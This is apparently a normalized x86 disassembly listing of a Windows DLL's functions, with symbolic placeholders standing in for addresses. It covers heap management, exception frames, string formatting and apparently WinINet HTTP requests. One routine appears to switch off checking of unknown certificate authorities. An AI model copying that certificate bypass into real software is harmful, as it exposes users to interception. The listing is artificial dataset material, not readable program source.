call [ ebp + 0xc ]
xor ecx ecx
cmp [ ebp - 0x14 ] ebx
sete cl
mov [ esi + 0x8 ] ecx
sub_10066573
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_10050de0
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_100665b0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ eax + 0x8 ]
mov eax edx
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] 0x0
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
sub_100665e9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_10024583
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_1004cfd7
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_10024583
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
push esi
call sub_10024583
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_10024583
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10024583
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_10024583
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_10024583
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_10024583
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10024583
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_10024583
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1002a3ee
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_10024583
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10024583
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_1006b64d
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_10066770
push ebp
mov ebp esp
push 0xffffffff
push sub_10081bb0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x78
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x144
push 0x0
mov [ ebp - 0x80 ] eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push eax
call sub_1004d9c0
jmp r-xdata
cmp [ edi + 0x14 ] 0x8
mov eax [ edi + 0x10 ]
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x78 ]
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x7c ] 0x0
mov [ ebp - 0x78 ] 0x0
call sub_1003b340
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp - 0x7c ]
test esi esi
jne r-xdata
mov edx edi
mov edx [ edi ]
jmp r-xdata
mov eax 0x1
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
call sub_1005a390
test eax eax
je r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x4b
call sub_10013830
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x78 ]
test esi esi
je r-xdata
lea ecx [ eax + eax ]
push esi
call sub_10030c50
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ ebp - 0x80 ]
lea ecx [ esi + 0x13c ]
call sub_100540c0
lea eax [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10044190
xor eax eax
lea edx [ ebp - 0x74 ]
mov eax 0x99
call sub_10013830
lea eax [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10044190
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_10066910
push ebp
mov ebp esp
push 0xffffffff
push sub_100806df
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
xor edi edi
push 0x4
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x14 ] eax
push edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call [ GetProcessHeap@IAT ]
mov ebx [ HeapAlloc@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] edi
push edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ ebx ]
jne r-xdata
mov edx [ eax + 0x4 ]
dec [ edx ]
cmp [ edx ] edi
jne r-xdata
mov [ esi + 0x3c ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_1002a500
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov ebx [ eax + 0x4 ]
inc [ ebx ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ebx
lea edx [ ebp - 0x18 ]
lea eax [ esi + 0x28 ]
mov [ ebp - 0x4 ] 0x5
cmp eax edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp ecx edi
je r-xdata
mov [ esi + 0x28 ] ecx
mov [ esi + 0x2c ] ebx
inc [ ebx ]
mov eax [ eax ]
cmp eax edi
je r-xdata
push ebx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov eax [ esi + 0x2c ]
cmp eax edi
je r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx ]
push 0x1
call eax
mov ecx [ ebp - 0x18 ]
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x18 ]
sub_10066ab0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008032b
mov eax [ fs : 0x0 ]
push eax
push ecx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x98
call sub_10055606
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ecx
mov ecx [ ebp + 0x8 ]
mov edi eax
call sub_10031cf0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0x18
sub_10066b40
push ebp
mov ebp esp
push 0xffffffff
push sub_10082646
mov eax [ fs : 0x0 ]
push eax
sub esp 0xe4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x1c ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
mov ebx ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xec ] eax
xor eax eax
mov [ ecx ] eax
mov [ ebp - 0xd4 ] ecx
push 0xffffffff
xor ecx ecx
mov [ ebp - 0xdc ] edx
mov [ edx ] eax
push eax
lea edx [ ebx + 0x24 ]
mov [ ebp - 0xac ] cx
push edx
lea ecx [ ebp - 0xac ]
mov [ ebp - 0xcc ] eax
mov [ ebp - 0xd0 ] eax
mov [ ebp - 0xe0 ] eax
mov [ ebp - 0xe4 ] eax
mov [ ebp - 0xd8 ] eax
mov [ ebp - 0x98 ] 0x7
mov [ ebp - 0x9c ] eax
call sub_10019180
mov [ ebp - 0x4 ] 0x0
cmp [ ebx + 0xb8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ ebp - 0x98 ] 0x8
jb r-xdata
cmp eax 0x1
jne r-xdata
push esi
mov ecx edi
lea esi [ ebp - 0xc8 ]
call sub_10039730
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x1
call sub_10043930
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0xb4 ] 0x8
jb r-xdata
mov eax 0x64
jmp r-xdata
mov eax [ ebp - 0xac ]
push eax
call sub_1006591f
add esp 0x4
lea edx [ ebp - 0x30 ]
mov eax 0x2d
call sub_10060ac0
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xd
call sub_10060ac0
lea edx [ ebp - 0x90 ]
mov eax 0x6
call sub_10060ac0
lea edx [ ebp - 0x1c ]
lea eax [ ebp - 0x90 ]
mov [ ebp - 0xd0 ] edx
mov [ ebp - 0xe0 ] eax
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xd8 ] edi
mov ecx [ ebp - 0xc8 ]
push ecx
call sub_1006591f
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x18
xor esi esi
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
xor edx edx
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
mov esi 0x1000
jmp r-xdata
neg eax
sbb eax eax
and eax 0x800000
or eax edx
push 0x0
or eax esi
or eax 0x84600900
push eax
mov eax [ ebp - 0xd0 ]
push 0x0
push 0x0
lea edx [ ebp - 0x30 ]
push edx
mov edx [ ebx + 0xd4 ]
push ecx
mov ecx [ ebx + 0xc4 ]
push eax
push ecx
call edx
mov esi eax
mov [ ebp - 0xd0 ] esi
test esi esi
jne r-xdata
lea ecx [ ebp - 0xac ]
mov edx 0x2000
jmp r-xdata
test eax eax
je r-xdata
cmp [ ebx + 0xb0 ] 0x0
je r-xdata
mov [ ebp - 0xcc ] 0x1
jmp r-xdata
cmp [ ebp - 0x98 ] 0x8
mov ecx [ ebp - 0xac ]
jae r-xdata
mov edx [ ebp - 0xd8 ]
mov eax [ ebp - 0xe4 ]
mov ecx [ ebp - 0xe0 ]
push edx
mov edx [ ebx + 0xe4 ]
push eax
push 0x0
push ecx
push esi
call edx
test eax eax
jne r-xdata
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
mov esi [ ebp - 0xd4 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov edi [ ebp - 0xec ]
mov ecx [ ebx + 0xdc ]
push 0x0
lea eax [ ebp - 0xf0 ]
push eax
push edi
push 0x20000013
push esi
mov [ ebp - 0xf0 ] 0x4
call ecx
test eax eax
jne r-xdata
mov [ ebp - 0xcc ] 0x2
jmp r-xdata
mov ecx [ ebx + 0xcc ]
push 0x4
lea eax [ ebp - 0xe8 ]
push eax
push 0x1f
push esi
mov [ ebp - 0xe8 ] 0x100
call ecx
cmp [ ebp - 0x98 ] 0x8
jb r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0xdc ]
mov [ esi ] 0x0
mov [ eax ] 0x0
cmp [ edi ] 0x12e
je r-xdata
mov [ ebp - 0xcc ] 0x3
jmp r-xdata
mov edx [ ebx + 0xd8 ]
push esi
call edx
cmp [ ebp - 0xcc ] 0x0
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ ebp - 0xac ]
push ecx
call sub_1006591f
add esp 0x4
mov edi [ ebp - 0xd4 ]
push esi
mov esi [ ebp - 0xdc ]
call sub_1000bbf0
mov esi [ ebp - 0xd0 ]
mov [ ebp - 0xcc ] eax
sub_10066e80
push ebp
mov ebp esp
push 0xffffffff
push sub_10080a18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov esi ecx
mov edi [ esi ]
lea ecx [ ebp - 0x54 ]
push ecx
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x54 ] 0x0
call sub_10047940
mov [ ebp - 0x64 ] eax
test eax eax
je r-xdata
mov ebx [ ebp - 0x54 ]
push 0x4
push 0x0
mov [ ebp - 0x58 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x1c
call sub_100050e0
mov edi [ ebp - 0x54 ]
test edi edi
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x64 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
mov eax edi
call sub_100542e0
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
mov esi [ ebp - 0x5c ]
mov edi [ HeapFree@IAT ]
test ebx ebx
je r-xdata
inc [ esi ]
mov [ ebp - 0x54 ] esi
mov edi [ ebp - 0x60 ]
lea edx [ ebp - 0x58 ]
push edx
mov [ ebp - 0x4 ] 0x0
call sub_10048a10
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
mov eax ebx
call sub_100542e0
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
sub_10066fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f241
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x64 ] 0x0
call sub_100558f0
push edi
push esi
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x1
call sub_10060fe0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x64 ] 0x1
mov [ ebp - 0x4 ] 0x0
call sub_1004f7a0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10067053
push 0xe0
mov eax sub_1007fb50
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa4 ] eax
movzx eax [ ebp + 0x1c ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x94 ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x14 ] bl
je r-xdata
lea eax [ ebp - 0xac ]
push eax
call sub_100688a0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1001552f
pop ecx
mov edi eax
mov [ ebp - 0x88 ] eax
lea ecx [ ebp - 0xac ]
lea eax [ ebp - 0xa8 ]
push eax
call sub_100688a0
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10059f39
mov edi eax
pop ecx
mov [ ebp - 0x88 ] edi
lea ecx [ ebp - 0xa8 ]
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
sub eax [ ebp + 0x34 ]
push esi
inc eax
push eax
push ebx
lea ecx [ ebp + 0x24 ]
call sub_1001ce05
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
call sub_10069ce0
add esi 0x8
push esi
push ebx
push 0x30
call sub_1003088d
movzx esi ax
add esp 0xc
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
mov [ ebp - 0x98 ] esi
call sub_10051f6c
mov eax [ edi ]
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x8c ] eax
cmp [ ebp + 0x34 ] eax
ja r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
and [ ebp - 0x1c ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x20 ] 0x0
mov esi [ ebp - 0x88 ]
mov eax [ esi ]
lea ecx [ ebp - 0x84 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx esi
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_1004ff82
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_100202c4
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
mov edi [ ebp - 0x8c ]
xor bl bl
xor edx edx
xor ecx ecx
mov ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x80 ]
push eax
call sub_10028071
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_10036380
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x7
call sub_10020b50
push eax
lea ecx [ ebp - 0x2c ]
call sub_10036380
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
call sub_10020b50
and [ ebp - 0x54 ] 0x0
xor eax eax
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov eax [ ebp - 0x90 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp [ ebp - 0x34 ] 0x10
mov edi [ ebp - 0x48 ]
movzx ebx ax
jae r-xdata
inc edx
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x34 ]
sub esi [ ebp - 0x8c ]
jmp r-xdata
lea edi [ ebp - 0x48 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov bl 0x1
add edx [ ebp - 0x54 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x84 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x90 ]
cmp [ ecx + 0x24 ] 0x0
mov eax [ ecx + 0x20 ]
jl r-xdata
add edx [ ebp - 0x1c ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor esi esi
jg r-xdata
cmp [ ebp + 0x34 ] edi
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
xor ebx ebx
cmp eax 0x100
jne r-xdata
cmp eax edx
jbe r-xdata
test eax eax
je r-xdata
xor eax eax
mov eax edi
sub eax [ ebp + 0x34 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push ebx
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_1001ce05
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x94 ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x9c ] eax
call sub_10044159
mov eax [ ebp - 0xa0 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xa0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10050c26
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
test bl bl
jne r-xdata
sub eax edx
mov esi eax
jmp r-xdata
xor esi esi
cmp esi edi
sbb esi esi
neg esi
add esi [ ebp + 0x34 ]
add esi eax
add edx esi
jmp r-xdata
mov edi eax
inc ebx
cmp ebx 0x4
jb r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10050c26
add esp 0x14
xor esi esi
cmp [ ebp - 0x50 ] 0x8
mov eax [ ebp - 0x64 ]
jae r-xdata
sub eax 0x7
je r-xdata
mov eax ecx
mov eax [ eax + 0x14 ]
and eax 0x1c0
mov [ ebp - 0x8c ] eax
cmp eax 0x40
je r-xdata
movsx eax [ ebp + ebx - 0x84 ]
sub eax 0x20
je r-xdata
cmp [ ebp - 0x1c ] 0x1
jbe r-xdata
push [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0xe4 ]
jmp r-xdata
lea eax [ ebp - 0x64 ]
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x90 ]
push esi
push [ ebp - 0x94 ]
xor edi edi
push [ ebp + 0x10 ]
mov [ eax + 0x20 ] edi
push [ ebp + 0xc ]
mov [ eax + 0x24 ] edi
push [ ebp - 0xa4 ]
call sub_10050c26
add esp 0x14
xor esi esi
push edi
inc esi
push esi
lea ecx [ ebp - 0x64 ]
call sub_10020b50
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_10020b50
push edi
push esi
lea ecx [ ebp - 0x48 ]
call sub_10041a20
push edi
push esi
lea ecx [ ebp + 0x24 ]
call sub_10020b50
mov eax [ ebp - 0xa4 ]
call sub_1004fa89
retn 0x38
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
test edi edi
jne r-xdata
dec eax
dec eax
je r-xdata
mov ecx [ ebp - 0x1c ]
add eax 0x2
dec ecx
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0xc ]
push eax
call sub_1004177f
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
push 0x1
push eax
lea eax [ ebp - 0xec ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp + 0x34 ] edi
ja r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
cmp [ ebp - 0x8c ] 0x100
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
push [ ebp - 0x98 ]
lea ecx [ ebp + 0xc ]
call sub_10044159
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_10044159
mov eax edi
sub eax [ ebp + 0x34 ]
push eax
push [ ebp - 0x98 ]
lea eax [ ebp - 0xd4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10050c26
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x14
cmp [ ebp + 0x38 ] 0x8
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x24 ]
jae r-xdata
push [ ebp + 0x34 ]
push eax
lea eax [ ebp - 0xbc ]
lea eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xcc ]
push [ ebp + 0xc ]
push eax
call sub_1004177f
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x88 ]
mov [ ebp + 0x10 ] eax
mov eax [ ecx ]
add esp 0x14
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_10044159
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
lea eax [ ebp + 0x24 ]
push [ ebp + 0x34 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xc4 ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
lea eax [ eax + ecx * 2 ]
push edi
push eax
lea eax [ ebp - 0xdc ]
jmp r-xdata
lea eax [ ebp + 0x24 ]
push eax
call sub_1004177f
add esp 0x14
jmp r-xdata
sub_100675d0
push ebp
